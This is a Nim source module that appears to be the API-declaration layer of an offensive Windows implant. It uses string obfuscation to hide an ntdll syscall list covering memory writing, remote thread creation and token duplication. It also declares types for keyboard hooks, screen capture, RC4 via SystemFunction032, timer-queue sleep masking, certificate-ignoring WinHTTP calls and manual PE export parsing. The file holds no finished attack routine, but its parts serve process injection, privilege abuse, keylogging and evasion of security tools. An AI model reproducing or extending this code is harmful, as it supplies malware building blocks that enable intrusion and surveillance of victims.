import ../global

let ntdllPath* = obf(r"C:\Windows\System32\ntdll.dll")
let syscallApis* = [
  obf("NtAllocateVirtualMemory"),
  obf("NtOpenProcess"),
  obf("NtWriteVirtualMemory"),
  obf("NtReadVirtualMemory"),
  obf("NtProtectVirtualMemory"),
  obf("NtCreateThreadEx"),
  obf("NtWaitForSingleObject"),
  obf("NtCreateEvent"),
  obf("NtSetEvent"),
  obf("NtSignalAndWaitForSingleObject"),
  obf("NtClose"),
  obf("NtFreeVirtualMemory"),
  obf("NtTerminateProcess"),
  obf("NtReadFile"),
  obf("NtOpenProcessToken"),
  obf("NtQueryInformationToken"),
  obf("NtAdjustPrivilegesToken"),
  obf("NtDuplicateToken"),
  obf("NtQueryInformationProcess"),
  obf("NtQuerySystemInformation"),
  obf("NtSuspendProcess"),
  obf("NtResumeProcess"),
  obf("NtCreateSection"),
  obf("NtMapViewOfSection"),
  obf("NtUnmapViewOfSection"),
]

type
  TCreateFileW* = proc(n: pointer; a, s: culong; sec: pointer; d, f, t: culong): pointer {.stdcall.}
  TReadFile* = proc(h, b: pointer; sz: culong; rd: ptr culong; o: pointer): culong {.stdcall.}
  TWriteFile* = proc(h, b: pointer; sz: culong; wr: ptr culong; o: pointer): culong {.stdcall.}
  TGetLastError* = proc(): culong {.stdcall.}
  TCreateFileA* = proc(n: pointer; a, s: culong; sec: pointer; d, f, tmpl: culong): pointer {.stdcall.}
  TCreateNamedPipeA* = proc(name: pointer; openMode, pipeMode: culong; maxInst, outBuf, inBuf, timeout: culong; sa: pointer): pointer {.stdcall.}
  TConnectNamedPipe* = proc(h, ov: pointer): culong {.stdcall.}
  TDisconnectNamedPipe* = proc(h: pointer): culong {.stdcall.}
  TFlushFileBuffers* = proc(h: pointer): int32 {.stdcall.}
  TWaitNamedPipeA* = proc(name: pointer; timeout: culong): culong {.stdcall.}
  TPeekNamedPipe* = proc(h, buf: pointer; bufSize: culong; bytesRead, totalAvail, bytesLeft: ptr culong): culong {.stdcall.}
  TCloseHandle* = proc(h: pointer): culong {.stdcall.}
  TGetFileSize* = proc(h: pointer; hi: ptr culong): culong {.stdcall.}
  TVirtualAlloc* = proc(lp: pointer; sz: csize_t; t, p: culong): pointer {.stdcall.}
  TVirtualFree* = proc(lp: pointer; sz: csize_t; t: culong): culong {.stdcall.}
  TGetModuleHandleA* = proc(name: cstring): pointer {.stdcall.}
  TVirtualProtect* = proc(lp: pointer; sz: culong; np: culong; lpOldProtect: ptr culong): culong {.stdcall.}
  TGetCurrentDirectoryW* = proc(n: culong; buf: pointer): culong {.stdcall.}
  TSetCurrentDirectoryW* = proc(path: pointer): culong {.stdcall.}
  TFindFirstFileW* = proc(path, data: pointer): pointer {.stdcall.}
  TFindNextFileW* = proc(h, data: pointer): culong {.stdcall.}
  TFindClose* = proc(h: pointer): culong {.stdcall.}
  TFileTimeToSystemTime* = proc(ft, st: pointer): culong {.stdcall.}
  TCreateDirectoryW* = proc(path, sec: pointer): culong {.stdcall.}
  TRemoveDirectoryW* = proc(path: pointer): culong {.stdcall.}
  TDeleteFileW* = proc(path: pointer): culong {.stdcall.}
  TCopyFileW* = proc(src, dst: pointer; fail: culong): culong {.stdcall.}
  TMoveFileW* = proc(src, dst, a, b: pointer; flags: culong): culong {.stdcall.}
  TGetFileAttributesW* = proc(path: pointer): culong {.stdcall.}
  TGetEnvironmentVariableW* = proc(name, val: pointer; sz: culong): culong {.stdcall.}
  TGetEnvironmentStringsW* = proc(): pointer {.stdcall.}
  TFreeEnvironmentStringsW* = proc(env: pointer): culong {.stdcall.}
  TWinHttpOpen* = proc(agent: pointer; access: culong; proxy, bypass: pointer; flags: culong): pointer {.stdcall.}
  TWinHttpConnect* = proc(session: pointer; host: pointer; port: uint16; flags: culong): pointer {.stdcall.}
  TWinHttpOpenRequest* = proc(conn: pointer; verb, path, version, referrer: pointer; accept: pointer; flags: culong): pointer {.stdcall.}
  TWinHttpSendRequest* = proc(req: pointer; headers: pointer; hlen: culong; body: pointer; blen, total: culong; ctx: culong): culong {.stdcall.}
  TWinHttpReceiveResponse* = proc(req: pointer; reserved: pointer): culong {.stdcall.}
  TWinHttpQueryHeaders* = proc(req: pointer; level: culong; name: pointer; buf: pointer; blen: ptr culong; idx: ptr culong): culong {.stdcall.}
  TWinHttpReadData* = proc(req: pointer; buf: pointer; toRead: culong; read: ptr culong): culong {.stdcall.}
  TWinHttpCloseHandle* = proc(h: pointer): culong {.stdcall.}
  TWinHttpSetOption* = proc(h: pointer; opt: culong; buf: pointer; blen: culong): culong {.stdcall.}
  TWinHttpAddRequestHeaders* = proc(req: pointer; headers: pointer; hlen: culong; mods: culong): culong {.stdcall.}
  TNtAlloc* = proc(procH: pointer; base: ptr pointer; zero: csize_t; size: ptr csize_t; typ, protect: culong): culong {.stdcall.}
  TNtOpen* = proc(h: ptr pointer; access: culong; oa, ci: pointer): culong {.stdcall.}
  TNtWrite* = proc(procH, base, buf: pointer; size: csize_t; written: ptr csize_t): culong {.stdcall.}
  TNtProtect* = proc(procH: pointer; base: ptr pointer; size: ptr csize_t; prot: culong; old: ptr culong): culong {.stdcall.}
  TNtCreateThreadEx* = proc(hThread: ptr pointer; access: culong; oa, procH, start, param: pointer; flags: culong; stackZero, stackCommit, stackReserve: csize_t; attr: pointer): culong {.stdcall.}
  TNtWait* = proc(h: pointer; alertable: culong; timeout: pointer): culong {.stdcall.}
  TNtCreateEvent* = proc(h: ptr pointer; access: culong; oa: pointer; typ, state: culong): culong {.stdcall.}
  TNtSignalAndWait* = proc(sig, wait: pointer; alert: culong; timeout: pointer): culong {.stdcall.}
  TNtClose* = proc(h: pointer): culong {.stdcall.}
  TNtFree* = proc(procH: pointer; base: ptr pointer; size: ptr csize_t; typ: culong): culong {.stdcall.}
  TNtTerminate* = proc(procH: pointer; status: culong): culong {.stdcall.}
  TNtRead* = proc(h, event, apc, apcCtx, iosb, buf: pointer; len: culong; offset, key: pointer): culong {.stdcall.}
  TNtOpenToken* = proc(procH: pointer; access: culong; token: ptr pointer): culong {.stdcall.}
  TNtQueryToken* = proc(token: pointer; cls: culong; info: pointer; len: culong; retLen: ptr culong): culong {.stdcall.}
  TNtAdjustToken* = proc(token: pointer; disableAll: culong; newState: pointer; bufLen: culong; prev: pointer; retLen: ptr culong): culong {.stdcall.}
  TNtDupToken* = proc(existing: pointer; access: culong; oa: pointer; effectiveOnly: culong; tokenType: culong; newToken: ptr pointer): culong {.stdcall.}
  TNtQueryProc* = proc(procH: pointer; cls: culong; info: pointer; len: culong; retLen: ptr culong): culong {.stdcall.}
  TNtQuerySys* = proc(cls: culong; info: pointer; len: culong; retLen: ptr culong): culong {.stdcall.}
  TLookupPrivilegeValueW* = proc(sys, name: pointer; luid: pointer): culong {.stdcall.}
  TLookupPrivilegeNameW* = proc(sys, luid: pointer; name: pointer; len: ptr culong): culong {.stdcall.}
  TLookupAccountSidW* = proc(
    sys, sid, name: pointer; nameLen: ptr culong; domain: pointer; domainLen: ptr culong; use: ptr culong
  ): culong {.stdcall.}
  TGetSidSubAuthorityCount* = proc(sid: pointer): ptr byte {.stdcall.}
  TGetSidSubAuthority* = proc(sid: pointer; idx: culong): ptr culong {.stdcall.}
  TGetSidIdentifierAuthority* = proc(sid: pointer): pointer {.stdcall.}
  TGetLogicalDriveStringsW* = proc(n: culong; buf: pointer): culong {.stdcall.}
  TGetComputerNameExW* = proc(nameType: culong; buf: pointer; size: ptr culong): culong {.stdcall.}
  TGetNativeSystemInfo* = proc(lpSystemInfo: pointer) {.stdcall.}
  TGlobalMemoryStatusEx* = proc(lpBuffer: pointer): culong {.stdcall.}
  TCreateToolhelp32Snapshot* = proc(flags, processId: culong): pointer {.stdcall.}
  TProcess32FirstW* = proc(hSnapshot: pointer; lppe: pointer): culong {.stdcall.}
  TProcess32NextW* = proc(hSnapshot: pointer; lppe: pointer): culong {.stdcall.}
  TQueryDosDeviceW* = proc(device, target: pointer; n: culong): culong {.stdcall.}
  TGetTickCount* = proc(): culong {.stdcall.}
  TGetTickCount64* = proc(): uint64 {.stdcall.}
  TGetProcessTimes* = proc(hProcess: pointer; lpCreationTime, lpExitTime, lpKernelTime, lpUserTime: pointer): culong {.stdcall.}
  TIsWow64Process* = proc(hProcess: pointer; wow64Process: ptr culong): culong {.stdcall.}
  TQueryFullProcessImageNameW* = proc(hProcess: pointer; dwFlags: culong; lpExeName: pointer; lpdwSize: ptr culong): culong {.stdcall.}
  TK32GetProcessMemoryInfo* = proc(hProcess: pointer; ppsmemCounters: pointer; cb: culong): culong {.stdcall.}
  TGetModuleFileNameW* = proc(hModule: pointer; lpFilename: pointer; nSize: culong): culong {.stdcall.}
  TGetPriorityClass* = proc(hProcess: pointer): culong {.stdcall.}
  TGetProcessHandleCount* = proc(hProcess: pointer; pdwHandleCount: ptr culong): culong {.stdcall.}
  TModule32FirstW* = proc(hSnapshot: pointer; lpme: pointer): culong {.stdcall.}
  TModule32NextW* = proc(hSnapshot: pointer; lpme: pointer): culong {.stdcall.}
  TWaitForSingleObjectEx* = proc(h: pointer; ms: culong; alertable: culong): culong {.stdcall.}
  TSystemFunction032* = proc(data, key: pointer): culong {.stdcall.}
  TRtlCreateTimerQueue* = proc(queue: ptr pointer): culong {.stdcall.}
  TRtlCreateTimer* = proc(queue: pointer; timer: ptr pointer; cb, ctx: pointer; due, period, flags: culong): culong {.stdcall.}
  TRtlDeleteTimerQueue* = proc(queue: pointer): culong {.stdcall.}
  TRtlDeleteTimerQueueEx* = proc(queue, completionEvent: pointer): culong {.stdcall.}
  TRtlRegisterWait* = proc(wait: ptr pointer; handle: pointer; cb, ctx: pointer; ms, flags: culong): culong {.stdcall.}
  TRtlDeregisterWait* = proc(wait: pointer): culong {.stdcall.}
  TRtlCaptureContext* = proc(ctx: pointer) {.stdcall.}
  TNtContinue* = proc(ctx: pointer; alert: culong): culong {.stdcall.}
  TNtSetEvent* = proc(ev: pointer; prev: ptr culong): culong {.stdcall.}
  TRegOpenKeyExW* = proc(hKey: pointer; lpSubKey: pointer; ulOptions: culong; samDesired: culong; phkResult: ptr pointer): culong {.stdcall.}
  TRegCreateKeyExW* = proc(
    hKey: pointer; subKey: pointer; reserved: culong; klass: pointer; options, samDesired: culong;
    sa: pointer; resultKey: ptr pointer; disposition: ptr culong
  ): culong {.stdcall.}
  TRegSetValueExW* = proc(
    hKey: pointer; valueName: pointer; reserved: culong; typ: culong; data: pointer; cbData: culong
  ): culong {.stdcall.}
  TRegQueryValueExW* = proc(hKey: pointer; lpValueName: pointer; lpReserved: pointer; lpType: ptr culong; lpData: pointer; lpcbData: ptr culong): culong {.stdcall.}
  TRegDeleteValueW* = proc(hKey: pointer; valueName: pointer): culong {.stdcall.}
  TRegDeleteKeyW* = proc(hKey: pointer; subKey: pointer): culong {.stdcall.}
  TRegQueryInfoKeyW* = proc(
    hKey: pointer; klass: pointer; classLen: ptr culong; reserved: ptr culong;
    subKeys: ptr culong; maxSubKeyLen: ptr culong; maxClassLen: ptr culong;
    values: ptr culong; maxValueNameLen: ptr culong; maxValueLen: ptr culong;
    secDesc: ptr culong; lastWrite: pointer
  ): culong {.stdcall.}
  TRegEnumKeyExW* = proc(
    hKey: pointer; index: culong; name: pointer; nameLen: ptr culong; reserved: ptr culong;
    klass: pointer; classLen: ptr culong; lastWrite: pointer
  ): culong {.stdcall.}
  TRegEnumValueW* = proc(
    hKey: pointer; index: culong; valueName: pointer; valueNameLen: ptr culong;
    reserved: ptr culong; typ: ptr culong; data: pointer; dataLen: ptr culong
  ): culong {.stdcall.}
  TRegCloseKey* = proc(hKey: pointer): culong {.stdcall.}
  TGetUserNameW* = proc(buffer: pointer; size: ptr culong): culong {.stdcall.}
  TGetNamedSecurityInfoW* = proc(
    name: pointer; objType: culong; secInfo: culong; owner, group: ptr pointer;
    dacl, sacl: ptr pointer; sd: ptr pointer,
  ): culong {.stdcall.}
  TGetAce* = proc(acl: pointer; aceIndex: culong; ace: ptr pointer): culong {.stdcall.}
  TConvertSidToStringSidW* = proc(sid: pointer; str: ptr pointer): culong {.stdcall.}
  TLocalFree* = proc(hMem: pointer): pointer {.stdcall.}
  TGetAdaptersAddresses* = proc(family, flags: culong; reserved: pointer; adapterAddresses: pointer; sizePointer: ptr culong): culong {.stdcall.}
  TGetAdaptersInfo* = proc(adapterInfo: pointer; outBufLen: ptr culong): culong {.stdcall.}
  TGetIpForwardTable* = proc(pIpForwardTable: pointer; pdwSize: ptr culong; bOrder: culong): culong {.stdcall.}
  TGetIpNetTable* = proc(pIpNetTable: pointer; pdwSize: ptr culong; bOrder: culong): culong {.stdcall.}
  TGetExtendedTcpTable* = proc(pTcpTable: pointer; pdwSize: ptr culong; bOrder: culong; ulAf: culong; tableClass: culong; reserved: culong): culong {.stdcall.}
  TGetExtendedUdpTable* = proc(pUdpTable: pointer; pdwSize: ptr culong; bOrder: culong; ulAf: culong; tableClass: culong; reserved: culong): culong {.stdcall.}
  TGetDriveTypeW* = proc(lpRootPathName: pointer): culong {.stdcall.}
  TGetCurrentProcessId* = proc(): culong {.stdcall.}
  TDuplicateHandle* = proc(
    hSourceProcessHandle, hSourceHandle, hTargetProcessHandle: pointer;
    lpTargetHandle: ptr pointer;
    dwDesiredAccess, bInheritHandle, dwOptions: culong
  ): culong {.stdcall.}
  TGetCurrentThreadId* = proc(): culong {.stdcall.}
  TOpenThread* = proc(access, inherit: culong; tid: culong): pointer {.stdcall.}
  TSuspendThread* = proc(h: pointer): culong {.stdcall.}
  TTerminateThread* = proc(h: pointer; code: culong): culong {.stdcall.}
  TSleep* = proc(ms: culong) {.stdcall.}
  TCreateProcessW* = proc(app, cmd: pointer; procAttr, threadAttr: pointer; inherit: culong; flags: culong; env, curDir: pointer; si, pi: pointer): culong {.stdcall.}
  TCreatePipe* = proc(hRead, hWrite: ptr pointer; sa: pointer; size: culong): culong {.stdcall.}
  TSetHandleInformation* = proc(h: pointer; mask, flags: culong): culong {.stdcall.}
  TGetStdHandle* = proc(std: culong): pointer {.stdcall.}
  TSetStdHandle* = proc(std: culong; h: pointer): culong {.stdcall.}
  TLoadLibraryA* = proc(lib: cstring): pointer {.stdcall.}
  TGetProcAddress* = proc(hMod, name: pointer): pointer {.stdcall.}
  TFreeLibrary* = proc(hMod: pointer): culong {.stdcall.}
  TCreateProcessA* = proc(app, cmd: pointer; procAttr, threadAttr: pointer; inherit, flags: culong; env, curDir, si, pi: pointer): culong {.stdcall.}
  TSetThreadToken* = proc(thread: pointer; token: pointer): culong {.stdcall.}
  TRevertToSelf* = proc(): culong {.stdcall.}
  TImpersonateLoggedOnUser* = proc(token: pointer): culong {.stdcall.}
  TLogonUserW* = proc(
    user, domain, password: pointer; logonType, provider: culong; token: ptr pointer): culong {.stdcall.}
  TDuplicateTokenEx* = proc(existing: pointer; access: culong; sa: pointer; impLevel: culong; tokenType: culong; newToken: ptr pointer): culong {.stdcall.}
  TCreateProcessAsUserW* = proc(
    hToken, app, cmd: pointer; procAttr, threadAttr: pointer; inherit, flags: culong;
    env, curDir, si, pi: pointer): culong {.stdcall.}
  TCreateProcessWithTokenW* = proc(
    hToken: pointer; logonFlags: culong; app, cmd: pointer; flags: culong;
    env, curDir, si, pi: pointer): culong {.stdcall.}
  TCreateProcessWithLogonW* = proc(
    user, domain, password: pointer; logonFlags: culong;
    app, cmdLine: pointer; creationFlags: culong;
    env, curDir, si, pi: pointer): culong {.stdcall.}
  TCreateEnvironmentBlock* = proc(env: ptr pointer; token: pointer; inherit: culong): culong {.stdcall.}
  TDestroyEnvironmentBlock* = proc(env: pointer): culong {.stdcall.}
  TLoadUserProfileW* = proc(token: pointer; profile: pointer): culong {.stdcall.}
  TUnloadUserProfile* = proc(token, profile: pointer): culong {.stdcall.}
  TOpenThreadToken* = proc(thread: pointer; access, openAsSelf: culong; token: ptr pointer): culong {.stdcall.}
  TGetCurrentThread* = proc(): pointer {.stdcall.}
  TOpenSCManagerA* = proc(machineName, databaseName: pointer; access: culong): pointer {.stdcall.}
  TOpenServiceA* = proc(scManager, serviceName: pointer; access: culong): pointer {.stdcall.}
  TQueryServiceStatusEx* = proc(service: pointer; infoLevel: culong; buffer: pointer; bufSize: culong; bytesNeeded: ptr culong): culong {.stdcall.}
  TStartServiceA* = proc(service: pointer; argc: culong; argv: pointer): culong {.stdcall.}
  TMultiByteToWideChar* = proc(cp, flags: culong; src: cstring; srcLen: cint; dst: pointer; dstLen: cint): cint {.stdcall.}
  TGetExitCodeThread* = proc(h: pointer; code: ptr culong): culong {.stdcall.}
  TExitThread* = proc(code: culong) {.stdcall.}
  TAddVectoredExceptionHandler* = proc(first: culong; handler: pointer): pointer {.stdcall.}
  TRemoveVectoredExceptionHandler* = proc(handle: pointer): culong {.stdcall.}
  TSetThreadStackGuarantee* = proc(stackBytes: ptr culong): culong {.stdcall.}
  TResumeThread* = proc(h: pointer): culong {.stdcall.}
  TGetDC* = proc(hwnd: pointer): pointer {.stdcall.}
  TReleaseDC* = proc(hwnd, hdc: pointer): culong {.stdcall.}
  TGetAsyncKeyState* = proc(vk: int32): int16 {.stdcall.}
  TSetWindowsHookExW* = proc(idHook: int32; lpfn: pointer; hmod: pointer; dwThreadId: culong): pointer {.stdcall.}
  TUnhookWindowsHookEx* = proc(hhk: pointer): culong {.stdcall.}
  TCallNextHookEx* = proc(hhk: pointer; nCode: int32; wParam: culong; lParam: pointer): culong {.stdcall.}
  TGetMessageW* = proc(lpMsg: pointer; hWnd: pointer; wMsgFilterMin, wMsgFilterMax: culong): int32 {.stdcall.}
  TPeekMessageW* = proc(lpMsg: pointer; hWnd: pointer; wMsgFilterMin, wMsgFilterMax: culong; wRemoveMsg: culong): culong {.stdcall.}
  TDispatchMessageW* = proc(lpMsg: pointer): culong {.stdcall.}
  TPostThreadMessageW* = proc(idThread: culong; msg: culong; wParam, lParam: culong): culong {.stdcall.}
  KbdLlHookStruct* = object
    vkCode*, scanCode*, flags*, time*: culong
    dwExtraInfo*: uint64
  WinMsg* = object
    hwnd*: pointer
    message*: culong
    wParam*, lParam*: culong
    time*: culong
    ptX*, ptY*: int32
  TGetDeviceCaps* = proc(hdc: pointer; idx: int32): int32 {.stdcall.}
  TCreateCompatibleDC* = proc(hdc: pointer): pointer {.stdcall.}
  TCreateCompatibleBitmap* = proc(hdc: pointer; w, h: int32): pointer {.stdcall.}
  TSelectObject* = proc(hdc, obj: pointer): pointer {.stdcall.}
  TBitBlt* = proc(dest: pointer; dx, dy, w, h: int32; src: pointer; sx, sy: int32; rop: culong): culong {.stdcall.}
  TStretchBlt* = proc(dest: pointer; dx, dy, dw, dh: int32; src: pointer; sx, sy, sw, sh: int32; rop: culong): culong {.stdcall.}
  TGetDIBits* = proc(hdc, bmp: pointer; start, lines: culong; bits: pointer; bmi: pointer; usage: culong): int32 {.stdcall.}
  TCreateDIBSection* = proc(hdc: pointer; bmi: pointer; usage: culong; bits: ptr pointer; section: pointer; offset: culong): pointer {.stdcall.}
  TDeleteObject* = proc(h: pointer): culong {.stdcall.}
  TDeleteDC* = proc(hdc: pointer): culong {.stdcall.}
  BitmapInfoHeader* = object
    biSize*, biWidth*, biHeight*: culong
    biPlanes*, biBitCount*: uint16
    biCompression*, biSizeImage*: culong
    biXPelsPerMeter*, biYPelsPerMeter*: culong
    biClrUsed*, biClrImportant*: culong
  SECURITY_ATTRIBUTES* = object
    nLength*: culong
    lpSecurityDescriptor*: pointer
    bInheritHandle*: culong
  CLIENT_ID* = object
    UniqueProcess*: pointer
    UniqueThread*: pointer
  OBJECT_ATTRIBUTES* = object
    Length*: culong
    RootDirectory*: pointer
    ObjectName*: pointer
    Attributes*: culong
    SecurityDescriptor*: pointer
    SecurityQoS*: pointer

  STARTUPINFOA* = object
    cb*: culong
    lpReserved*: cstring
    lpDesktop*: cstring
    lpTitle*: cstring
    dwX*, dwY*, dwXSize*, dwYSize*: culong
    dwXCountChars*, dwYCountChars*: culong
    dwFillAttribute*, dwFlags*: culong
    wShowWindow*: uint16
    cbReserved2*: uint16
    lpReserved2*: pointer
    hStdInput*, hStdOutput*, hStdError*: pointer

  PROCESS_INFORMATION* = object
    hProcess*, hThread*: pointer
    dwProcessId*, dwThreadId*: culong

  EXCEPTION_RECORD* = object
    ExceptionCode*, ExceptionFlags*: culong
    ExceptionRecord*: ptr EXCEPTION_RECORD
    ExceptionAddress*: pointer
    NumberParameters*: culong
    ExceptionInformation*: array[15, culong]

  EXCEPTION_POINTERS* = object
    ExceptionRecord*: ptr EXCEPTION_RECORD
    ContextRecord*: pointer

  BitmapInfo* = object
    bmiHeader*: BitmapInfoHeader
    bmiColors*: array[1, culong]

  BitmapFileHeader* = object
    bfType*: uint16
    bfSize*, bfReserved*, bfOffBits*: culong

  SocketHandle* = uint64
  SockAddrIn* = object
    sin_family*: int16
    sin_port*: uint16
    sin_addr*: uint32
    sin_zero*: array[8, char]
  WsaTimeVal* = object
    tv_sec*: int32
    tv_usec*: int32
  WsaFdSet* = object
    fd_count*: uint32
    fd_array*: array[1, SocketHandle]
  WsaData* = object
    wVersion*: uint16
    wHighVersion*: uint16
    szDescription*: array[257, char]
    szSystemStatus*: array[129, char]
    iMaxSockets*: uint16
    iMaxUdpDg*: uint16
    lpVendorInfo*: pointer
  HostEnt* = object
    h_name*: cstring
    h_aliases*: pointer
    h_addrtype*: int16
    h_length*: int16
    h_addr_list*: ptr pointer

  TWsaStartup* = proc(wVersionRequested: uint16; lpWSAData: pointer): int32 {.stdcall.}
  TWsaCleanup* = proc(): int32 {.stdcall.}
  TWs2Socket* = proc(af, typ, protocol: int32): SocketHandle {.stdcall.}
  TWs2Connect* = proc(s: SocketHandle; name: pointer; namelen: int32): int32 {.stdcall.}
  TWs2CloseSocket* = proc(s: SocketHandle): int32 {.stdcall.}
  TWs2Select* = proc(nfds: int32; readfds, writefds, exceptfds: pointer; timeout: pointer): int32 {.stdcall.}
  TWs2IoctlSocket* = proc(s: SocketHandle; cmd: int32; argp: pointer): int32 {.stdcall.}
  TWs2SendTo* = proc(s: SocketHandle; buf: pointer; len, flags: int32; to: pointer; tolen: int32): int32 {.stdcall.}
  TWsaGetLastError* = proc(): int32 {.stdcall.}
  TInetAddr* = proc(cp: cstring): uint32 {.stdcall.}
  THtons* = proc(hostshort: uint16): uint16 {.stdcall.}
  TGetHostByName* = proc(name: cstring): pointer {.stdcall.}
  TWs2GetSockOpt* = proc(s: SocketHandle; level, optname: int32; optval: pointer; optlen: pointer): int32 {.stdcall.}

const
  PAGE_NOACCESS* = culong(0x01)
  PAGE_READONLY* = culong(0x02)
  PAGE_READWRITE* = culong(0x04)
  PAGE_WRITECOPY* = culong(0x08)
  PAGE_EXECUTE* = culong(0x10)
  PAGE_EXECUTE_READ* = culong(0x20)
  PAGE_EXECUTE_WRITECOPY* = culong(0x80)
  PAGE_EXECUTE_READWRITE* = culong(0x40)
  MEM_COMMIT* = culong(0x1000)
  MEM_RESERVE* = culong(0x2000)
  MEM_TOP_DOWN* = culong(0x100000)
  MEM_RELEASE* = culong(0x8000)
  CREATE_NO_WINDOW* = culong(0x08000000)
  CP_ACP* = culong(0)
  MB_ERR_INVALID_CHARS* = culong(0x8)
  EXCEPTION_CONTINUE_SEARCH* = culong(0)
  INFINITE* = culong(0xFFFFFFFF)
  contextFull* = culong(0x10001F)
  wtExecuteInTimerThread* = culong(0x20)
  wtExecuteOnlyOnce* = culong(0x8)
  wtExecuteInWaitThread* = culong(0x4)
  notificationEvent* = culong(1)
  eventAllAccess* = culong(0x1F0003)
  horzres* = 8'i32
  vertres* = 10'i32
  desktopHorzres* = 118'i32
  desktopVertres* = 117'i32
  srccopy* = 0x00CC0020'u32
  biRgb* = 0'u32
  dibRgbColors* = 0'u32
  invalidHandle* = cast[pointer](-1)
  genericRead* = 0x80000000'u32
  genericWrite* = 0x40000000'u32
  openExisting* = 3'u32
  pipeAccessDuplex* = 0x00000003'u32
  pipeTypeByte* = 0x00000000'u32
  pipeReadmodeByte* = 0x00000000'u32
  pipeWait* = 0x00000000'u32
  pipeUnlimitedInstances* = 255'u32
  errorPipeConnected* = 535'u32
  errorPipeBusy* = 231'u32
  hkeyClassesRoot* = cast[pointer](0x80000000)
  hkeyCurrentUser* = cast[pointer](0x80000001)
  hkeyLocalMachine* = cast[pointer](0x80000002)
  hkeyUsers* = cast[pointer](0x80000003)
  hkeyCurrentConfig* = cast[pointer](0x80000005)
  keyRead* = 0x20019'u32
  keyWrite* = 0x20006'u32
  keySetValue* = 0x0002'u32
  regOptionNonVolatile* = 0'u32
  regSz* = 1'u32
  regExpandSz* = 2'u32
  regBinary* = 3'u32
  regDword* = 4'u32
  regQword* = 11'u32
  errorSuccess* = 0'u32
  gaaFlagIncludePrefix* = 0x10'u32
  afInet* = 2'i32
  sockStream* = 1'i32
  sockDgram* = 2'i32
  ipprotoTcp* = 6'i32
  ipprotoUdp* = 17'i32
  invalidSocketHandle* = SocketHandle(0xFFFFFFFFFFFFFFFF'u64)
  ws2SocketError* = -1'i32
  fionbio* = 0x8004667E'i32
  wsaeWouldBlock* = 10035'i32
  inaddrNone* = 0xFFFFFFFF'u32
  solSocket* = 0xFFFF'i32
  soError* = 0x1007'i32
  # winhttp
  winhttpAccessAutomaticProxy* = culong(4)
  winhttpFlagSecure* = culong(0x00800000)
  winhttpAddreqFlagAdd* = culong(0x20000000)
  winhttpAddreqFlagReplace* = culong(0x80000000)
  winhttpQueryContentLength* = culong(5)
  winhttpQueryStatusCode* = culong(19)
  winhttpQueryFlagNumber* = culong(0x20000000)
  winhttpOptionSecurityFlags* = culong(31)
  securityFlagIgnoreUnknownCa* = culong(0x00000100)
  securityFlagIgnoreCertWrongUsage* = culong(0x00000200)
  securityFlagIgnoreCertCnInvalid* = culong(0x00001000)
  securityFlagIgnoreCertDateInvalid* = culong(0x00002000)

proc u32*(p: pointer; o: int = 0): culong {.inline.} =
  # Reads an unsigned 32 bit value at the given offset
  cast[ptr culong](cast[int](p) + o)[]

proc exportRva*(nt: pointer): culong =
  # Returns the export directory address from the nt headers
  let opt = cast[pointer](cast[int](nt) + 24)
  let magic = cast[ptr uint16](opt)[]
  let off = if magic == 0x20B'u16: 112 else: 96
  u32(opt, off)

proc rva*(buf: pointer; rva: culong; nt: pointer): pointer =
  # Converts a relative virtual address into a buffer pointer
  let nsec = cast[ptr uint16](cast[int](nt) + 6)[]
  let opt = cast[ptr uint16](cast[int](nt) + 20)[]
  var sec = cast[int](nt) + 24 + opt.int
  for _ in 0 ..< nsec.int:
    let s = cast[pointer](sec)
    let va = u32(s, 12)
    if rva >= va and rva < va + u32(s, 16):
      return cast[pointer](cast[int](buf) + u32(s, 20).int + (rva - va).int)
    sec += 40
  nil
